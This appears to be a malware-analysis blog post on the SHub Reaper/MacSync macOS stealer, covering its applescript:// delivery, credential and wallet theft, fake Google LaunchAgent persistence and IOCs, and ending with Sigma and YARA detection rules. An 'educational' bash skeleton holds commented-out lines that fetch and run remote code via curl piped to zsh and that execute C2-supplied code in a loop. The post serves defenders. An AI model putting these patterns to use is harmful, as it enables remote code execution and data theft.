---
layout: post
title: "SHub Reaper Lives On: MacSync Shell Script Drops on MalwareBazaar Today"
date: 2026-05-29
categories: [malware, analysis]
tags: [macsync, shub-reaper, macos, stealer, applescript, mitre-attack, launchagent, clickfix]
excerpt: "A fresh MacSync/SHub shell script hit MalwareBazaar this morning, eleven days after SentinelOne documented Reaper's AppleScript-based bypass of Apple's own Terminal mitigation."
---

## What showed up

This morning at 06:35 UTC, a 1,305-byte shell script landed on MalwareBazaar. Reporter `JAMESWT_WT`, origin country Italy. ReversingLabs calls it `MacOS.Trojan.MacSyncStealer`. VMRay classifies it as `SHubStealer`. Both names point to the same family.

SHA256: `63f6dcab9e0dabb78449efda7aa7ecd2c10a8ef4e35b7f7346df76c60d17e12f`  
MalwareBazaar: [https://bazaar.abuse.ch/sample/63f6dcab9e0dabb78449efda7aa7ecd2c10a8ef4e35b7f7346df76c60d17e12f/](https://bazaar.abuse.ch/sample/63f6dcab9e0dabb78449efda7aa7ecd2c10a8ef4e35b7f7346df76c60d17e12f/)

Two companion samples (`6cfdf4ec...` and `1d67c1c1...`) dropped in the same two-minute window by the same reporter, all tagged `MacSync` and `MacSyncStealer`. Same campaign, same infrastructure. Kaspersky OpenTIP flags all three as malicious. XProtect (Apple's built-in scanner) flags none of them, which tells you exactly why this family is still active.

On May 18, SentinelOne published a detailed breakdown of the latest SHub variant, internally tagged "Reaper." That was eleven days ago. New samples are still coming in. This family is not slowing down.

## What makes it work

The core problem SHub Reaper is solving is a platform-level change Apple shipped in macOS Tahoe 26.4 in late March 2026. That update blocked the most common ClickFix technique on macOS: pasting a terminal command from a fake CAPTCHA or error page. Attackers had been abusing user muscle memory for two years with that trick and Apple finally killed the obvious vector. SHub operators adapted in roughly four weeks.

The new delivery path uses the `applescript://` URL scheme. Clicking a link opens macOS Script Editor pre-loaded with a payload. No Terminal involved. The malicious command is pushed below the visible scroll position with several kilobytes of ASCII art and fake installer copy, so a casual user sees what looks like a harmless installer script. One click on "Run" and execution begins. Clever social engineering layered on top of a legitimate OS feature.

What the AppleScript actually does is short: it prints a fake progress message referencing Apple's XProtectRemediator update tool (`Downloading Update: https://support.apple.com/downloads/xprotect-remediator-150.dmg`) while silently decoding a base64-encoded curl command and piping it to zsh. That curl hits the C2 to pull the real payload.

Before stealing anything, the stub checks the victim's locale. It reads `~/Library/Preferences/com.apple.HIToolbox.plist` and looks for Russian input sources. If it finds them it sends a `cis_blocked` event to the C2 and exits cleanly. Operators protecting their infrastructure from researchers in CIS countries.

The delivery site fingerprints visitors before serving the payload at all. JavaScript collects IP, location, WebGL data, and checks for VPN or VM indicators. It also enumerates installed browser extensions, specifically looking for password managers like Bitwarden and 1Password, and crypto wallets like MetaMask and Phantom. That enumeration gets shipped to a hardcoded Telegram bot before the payload is even served. Anti-analysis measures are stacked on top: `console.*` functions are overridden, F12 triggers a DevTools interceptor that stalls execution in a continuous debugger loop, and a `devtoolschange` listener overwrites the page with a Russian "Access Denied" message (`<h1>Доступ запрещен</h1>`) if a researcher gets past the first layer.

The fake lure domains are `qq-0732gwh22[.]com` (fake WeChat installer), `mlcrosoft[.]co[.]com` (typo-squatted Microsoft), and `mlroweb[.]com` (fake Miro installer). The infection chain shifts brand at every stage: a WeChat lure delivers from a Microsoft-lookalike domain, executes as a fake Apple security update, and persists through a fake Google directory structure. Any one of those brands in isolation looks plausible. That's the point.

Once the user clicks Run and supplies their macOS login password through an AppleScript dialog, the full theft begins. The macOS Keychain is the main target. The harvested password decrypts it directly via the Security framework, no `security` CLI output to catch in logs. Beyond Keychain, the stealer hits browser profile directories for Chrome (`~/Library/Application Support/Google/Chrome/`), Firefox, Brave, Edge, Opera, Vivaldi, Arc, and Orion, specifically the `Login Data` SQLite database, `Cookies`, and `Web Data` files. Cookie data from those paths lets an attacker bypass 2FA on services that use session persistence.

Desktop wallet apps get a more aggressive treatment. Exodus, Atomic Wallet, Ledger Live, and Trezor Suite don't just have their data read. The malware downloads a modified `app.asar` from the C2, terminates the active wallet process, replaces the legitimate application core, clears quarantine attributes with `xattr -cr`, and re-signs the modified bundle with ad-hoc codesigning. That is wallet hijacking, not credential theft. Future transactions in those apps will go to attacker-controlled addresses.

The Reaper variant also added a file grabber module resembling AMOS (Atomic macOS Stealer). It recurses through `~/Desktop` and `~/Documents` looking for `.docx`, `.doc`, `.wallet`, `.key`, `.keys`, `.txt`, `.rtf`, `.csv`, `.xls`, `.xlsx`, `.json`, and `.rdp` files under 2MB, plus `.png` images under 6MB. Collection is capped at 150MB total. Files stage in `/tmp/shub_<random>/`, then either upload as a single archive or get split into 70MB chunks via `/tmp/shub_split.sh` and posted to `hebsbsbzjsjshduxbs[.]xyz/gate/chunk` over curl.

Persistence runs through a LaunchAgent disguised as Google's update infrastructure. The malware creates `~/Library/Application Support/Google/GoogleUpdate.app/Contents/MacOS/GoogleUpdate`, a bash script that beacons to the C2's `/api/bot/heartbeat` endpoint every 60 seconds. The matching plist is `~/Library/LaunchAgents/com.google.keystone.agent.plist`. Google's legitimate Keystone update service uses almost identical paths, which makes this easy to walk past during a casual inspection.

When the heartbeat C2 responds with a `"code"` value, the script decodes it, writes it to `/tmp/.c.sh`, executes it, and deletes the file. A persistent RCE backdoor operating entirely through shell primitives, with no binary ever written to a permanent path.

## Educational sample

The skeleton below shows the AppleScript delivery and LaunchAgent persistence patterns from SHub Reaper. No payload logic, no C2 contact.

```bash
#!/bin/bash
# EDUCATIONAL SAMPLE — demonstrates AppleScript-based delivery + LaunchAgent persistence
# This does NOT contain any malicious payload
# For research and defensive awareness only

# --- Stage 1: AppleScript delivery skeleton ---
# Real variant arrives via applescript:// URL, opens Script Editor pre-loaded.
# This is the shell-equivalent structural pattern.

FAKE_UPDATE_MSG="Downloading Update: https://support.apple.com/downloads/xprotect-remediator-150.dmg"

# CIS locale check: exit clean if Russian input source is active
if defaults read ~/Library/Preferences/com.apple.HIToolbox.plist \
   AppleEnabledInputSources 2>/dev/null | grep -qi "russian"; then
    echo "cis_blocked"
    exit 0
fi

# Real variant decodes a base64 C2 URL and pipes to zsh here:
# ENCODED_URL="aHR0cHM6Ly88cmVkYWN0ZWQ+"
# curl -s "$(echo "$ENCODED_URL" | base64 -d)" | zsh

echo "[DEMO] Would fetch and execute remote payload here"
echo "[DEMO] Fake status message: $FAKE_UPDATE_MSG"

# --- Stage 2: LaunchAgent persistence skeleton ---
# Real variant uses Google Keystone paths to blend in with legitimate software

LAUNCH_AGENT_DIR="$HOME/Library/LaunchAgents"
APP_SUPPORT_DIR="$HOME/Library/Application Support/Google/GoogleUpdate.app/Contents/MacOS"

echo "[DEMO] LaunchAgent plist target: $LAUNCH_AGENT_DIR/com.google.keystone.agent.plist"
echo "[DEMO] Backdoor script target:   $APP_SUPPORT_DIR/GoogleUpdate"

# Real plist runs GoogleUpdate every 60 seconds:
# <key>StartInterval</key><integer>60</integer>
# <key>ProgramArguments</key><array><string>/path/to/GoogleUpdate</string></array>

# --- Stage 3: Backdoor beacon skeleton ---
# On each heartbeat, if C2 returns {"code":"..."}, decode and exec then delete
C2_HOST="[REDACTED]"
# RESPONSE=$(curl -s "$C2_HOST/api/bot/heartbeat" -d "{\"id\":\"$MACHINE_ID\"}")
# CODE=$(echo "$RESPONSE" | python3 -c "import json,sys; print(json.load(sys.stdin).get('code',''))")
# if [ -n "$CODE" ]; then
#     echo "$CODE" | base64 -d > /tmp/.c.sh
#     bash /tmp/.c.sh
#     rm -f /tmp/.c.sh
# fi

echo "[DEMO] Heartbeat pattern shown, no real C2 contact made"
```

## Detection and defense

The cleanest detection path is `osascript` process behavior, not file scanning. XProtect never caught these samples because there are no binaries to scan. Endpoint telemetry is the only reliable signal.

On macOS, watch for `osascript` or `Script Editor.app` spawning child processes, particularly `curl`, `bash`, or `zsh`. That parent-child chain almost never happens in normal user workflows. If you see `Script Editor` spawning `zsh` spawning `curl`, that's this campaign or something closely related.

For Sysmon on macOS endpoints, Event ID 1 (process creation) with parent image `Script Editor` and command line containing `curl` or `base64 -d` is a high-confidence indicator. Event ID 11 (file creation) at `~/Library/LaunchAgents/com.google.keystone.agent.plist` is another solid hit, particularly if the file appears after an interactive session rather than during a legitimate Google software update.

The LaunchAgent persistence path is specific. Check `~/Library/LaunchAgents/com.google.keystone.agent.plist` and verify the `ProgramArguments` value points to `/Library/Google/GoogleSoftwareUpdate/`, which is Google's legitimate path. The fake version points into `~/Library/Application Support/Google/`.

Sigma rule for this persistence:

```yaml
title: SHub Reaper Fake Google LaunchAgent
status: experimental
logsource:
  product: macos
  category: file_event
detection:
  selection:
    TargetFilename|contains: 'Library/LaunchAgents/com.google.keystone.agent.plist'
    TargetFilename|contains: '/Users/'
  filter_legitimate:
    TargetFilename|contains: '/Library/Google/GoogleSoftwareUpdate/'
  condition: selection and not filter_legitimate
falsepositives:
  - None expected
level: high
tags:
  - attack.persistence
  - attack.t1543.001
```

YARA rule for the CIS locale check and staging directory pattern:

```yara
rule SHub_Reaper_Shell_Indicators {
    meta:
        description = "Detects SHub Reaper macOS stealer shell script patterns"
        author = "Garrett Stimpson"
        date = "2026-05-29"
        reference = "https://bazaar.abuse.ch/sample/63f6dcab9e0dabb78449efda7aa7ecd2c10a8ef4e35b7f7346df76c60d17e12f/"

    strings:
        $cis_check = "AppleEnabledInputSources" ascii
        $russian_check = "russian" ascii nocase
        $shub_dir = "/tmp/shub_" ascii
        $c2_heartbeat = "/api/bot/heartbeat" ascii
        $wallet_target = "app.asar" ascii
        $xattr_clear = "xattr -cr" ascii

    condition:
        filesize < 50KB and
        ($cis_check and $russian_check) or
        ($shub_dir and $c2_heartbeat) or
        ($wallet_target and $xattr_clear)
}
```

For network detection, block or alert on outbound connections to `hebsbsbzjsjshduxbs[.]xyz`. DNS queries for that hostname are unambiguous. C2 endpoints: `/api/debug/event`, `/api/bot/heartbeat`, `/gate`, `/gate/chunk`.

The mitigation is straightforward in principle and annoying in practice. macOS Gatekeeper protects against unsigned binaries, but AppleScript running inside Script Editor is a signed Apple process. Short of disabling Script Editor entirely or blocking the `applescript://` URL scheme at the browser level, users need to understand that clicking "Run" in Script Editor is functionally identical to running something in Terminal. Any page that asks you to open Script Editor is malicious, full stop. Enterprise environments should consider blocking `com.apple.ScriptEditor2` via MDM if AppleScript isn't a business requirement.

MITRE ATT&CK: T1059.002 (AppleScript), T1555 (Credentials from Password Stores), T1555.003 (Credentials from Web Browsers), T1543.001 (LaunchAgent persistence), T1027 (Obfuscated Files and Information), T1497 (Virtualization/Sandbox Evasion), T1041 (Exfiltration Over C2 Channel), T1560 (Archive Collected Data).

---

*Research sources: SentinelOne SentinelLabs (Phil Stokes, May 18 2026), Jamf Threat Labs, MalwareBazaar sample database.*
